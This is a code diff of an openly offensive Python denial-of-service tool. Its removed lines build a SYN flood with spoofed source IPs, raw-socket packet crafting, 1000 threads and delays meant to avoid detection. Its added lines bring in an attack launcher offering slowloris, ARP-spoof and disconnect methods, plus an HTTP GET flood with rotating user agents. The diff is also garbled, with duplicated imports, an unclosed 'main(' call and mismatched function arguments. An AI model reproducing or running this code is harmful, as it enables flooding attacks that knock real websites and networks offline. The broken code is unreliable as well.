@@ -1,12 +1,23 @@
+# -*- coding: utf-8 -*-
 import os
-import socket
-import random
-import threading
-import struct
+import sys
 import time
-import argparse
 import fade
-import ipaddress
+import requests
+import sys
+import threading
+import random
+import re
+import argparse
+import json
+import random
+import fade
+import requests
+from colorama import Fore as F
+from requests.exceptions import Timeout
+
+os.chdir(os.path.dirname(os.path.realpath(__file__)))
+os.system("cls" if os.name == "nt" else "clear")
 
 os.system("clear")
 logo = """
@@ -20,109 +31,92 @@ logo = """
 faded_text = fade.fire(logo)
 print(faded_text)
 
-def ipv4():
-    net4 = ipaddress.ip_network('0.0.0.0/0')
-    for ips in net4:
-
-    ipv4()
-# Random IP Spoofing
-def random_ip():
-    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-
-# Random port generator to make it harder to block specific port ranges
-def random_port():
-    return random.randint(1024, 65535)
-
-# Generate a random TCP sequence number
-def random_seq():
-    return random.randint(0, 4294967295)
-
-# Generate a random TCP window size
-def random_window_size():
-    return random.randint(1024, 65535)
-
-# Create a fake/custom IP header
-def create_ip_header(source_ip, dest_ip):
-    ip_header = struct.pack('!BBHHHBBH4s4s',
-                            69,  # Version and header length (IPv4, 5 * 32 bits = 20 bytes)
-                            0,   # Type of service
-                            40,  # Total length
-                            random.randint(0, 65535),  # Identification
-                            0,   # Flags and Fragment Offset
-                            255, # Time to live
-                            socket.IPPROTO_TCP,  # Protocol
-                            0,   # Header checksum (leave as 0, calculated by kernel)
-                            socket.inet_aton(source_ip),  # Source IP
-                            socket.inet_aton(dest_ip))    # Destination IP
-    return ip_header
-
-# Create a TCP header with SYN flag set
-def create_tcp_header(source_port, dest_port):
-    tcp_header = struct.pack('!HHLLBBHHH',
-                            source_port,  # Source port
-                            dest_port,    # Destination port
-                            random_seq(),  # Sequence number
-                            0,            # Acknowledgment number
-                            80,           # Data offset and Reserved (TCP Header length)
-                            2,            # Flags (SYN flag set)
-                            random_window_size(),  # Window size
-                            0,            # Checksum (leave as 0, calculated by kernel)
-                            0)            # Urgent pointer
-    return tcp_header
 
 
-# SYN Flood Attack with IP Spoofing and randomized packet structure
-def syn_flood(target_ip, target_port):
-    while True:
-        try:
-            # Create raw socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            # Spoofed source IP
-            source_ip = random_ip()
-            dest_ip = target_ip
-            # Random source port to avoid rate-limiting on a fixed port
-            source_port = random_port()
-            # Create IP and TCP headers
-            ip_header = create_ip_header(source_ip, dest_ip)
-            tcp_header = create_tcp_header(source_ip, dest_ip, source_port, target_port)
-            # Packet = IP header + TCP header
-            packet = ip_header + tcp_header
-            # Send the SYN packet
-            s.sendto(packet, (dest_ip, 0))
-            print(f"Sent SYN packet from {source_ip}:{source_port} to {dest_ip}:{target_port}")
-            # Randomize the delay between packets (anti-rate limiting)
-            time.sleep(random.uniform(0.1, 1.5))  # Add delay between 0.1 to 1.5 seconds to avoid detection
-        except Exception as e:
-            print(f"Error: {e}")
 
-# Function to resolve domain to IP using nslookup
-def resolve_domain(domain):
+try:
+    from tools.addons.checks import (check_http_target_input,
+                                     check_local_target_input,
+                                     check_method_input, check_number_input)
+    from tools.addons.ip_tools import show_local_host_ips
+    from tools.addons.logo import show_logo
+    from tools.method import AttackMethod
+except (ImportError, NameError) as err:
+    print("\nFailed to import something", err)
+
+
+def main() -> None:
+    """Run main application."""
+    show_logo()
     try:
-        return socket.gethostbyname(domain)
-    except socket.gaierror as e:
-        print(f"Could not resolve domain {domain}: {e}")
-        return None
+        if (method := check_method_input()) in ["arp-spoof", "disconnect"]:
+            show_local_host_ips()
+        target = (
+            check_http_target_input()
+            if method not in ["arp-spoof", "disconnect"]
+            else check_local_target_input()
+        )
+        threads = (
+            check_number_input("threads")
+            if method not in ["arp-spoof", "disconnect"]
+            else 1
+        )
+        time = check_number_input("time")
+        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0
 
-# Main function to run the attack
-def main():
-    # Set up argument parsing
-    parser = argparse.ArgumentParser(description='Perform SYN Flood DDoS attack with IP Spoofing and Proxies.')
-    parser.add_argument('-u', '--url', type=str, required=True, help='Target website URL')
-    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default is 80 for HTTP)')
-    args = parser.parse_args()
+        with AttackMethod(
+            duration=time,
+            method_name=method,
+            threads=threads,
+            target=target,
+            sleep_time=sleep_time,
+        ) as attack:
+            attack.start()
+    except KeyboardInterrupt:
+        print(
+            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
+        )
+        sys.exit(1)
 
-    # Resolve the target domain to IP
-    target_ip = resolve_domain(args.url)
-    if not target_ip:
-        print(f"Error: Could not resolve the target URL: {args.url}")
-        return
-    print(f"Resolved {args.url} to IP: {target_ip}")
-
-    # Launch multiple threads for more attack intensity
-    threads = 1000  # Increase for higher load
-    for _ in range(threads):
-        thread = threading.Thread(target=syn_flood, args=(target_ip, args.port))
-        thread.start()
 
 if __name__ == "__main__":
-    main()
+    main(
+
+with open("tools/L7/user_agents.json", "r") as agents:
+    user_agents = json.load(agents)["agents"]
+
+
+headers = {
+    "X-Requested-With": "XMLHttpRequest",
+    "Connection": "keep-alive",
+    "Pragma": "no-cache",
+    "Cache-Control": "no-cache",
+    "Accept-Encoding": "gzip, deflate, br",
+}
+
+color_code = {True: F.GREEN, False: F.RED}
+
+
+def flood(target: str) -> None:
+    """Start an HTTP GET request flood.
+
+    Args:
+        - target - Target's URL
+
+    Returns:
+        None
+    """
+    global headers
+
+    headers["User-agent"] = random.choice(user_agents)
+
+    try:
+        response = requests.get(target, headers=headers, timeout=4)
+    except (Timeout, OSError):
+        return
+    else:
+        status = (
+            f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
+        )
+        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
+        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")
